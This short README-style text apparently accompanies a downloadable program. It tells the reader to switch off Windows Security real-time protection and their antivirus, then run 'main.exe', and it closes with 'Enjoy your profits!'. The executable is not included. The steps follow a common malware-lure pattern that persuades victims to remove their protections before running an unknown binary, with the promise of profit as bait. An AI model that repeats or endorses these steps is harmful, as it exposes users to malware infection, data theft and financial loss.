- Select Start and type "Windows Security" to search for that app. Select the Windows Security app from the search results, go to Virus & threat protection, and under Virus & threat protection settings select Manage settings. Switch Real-time protection to Off.

- disable your antivirus

- RUN main.exe

Enjoy your profits !
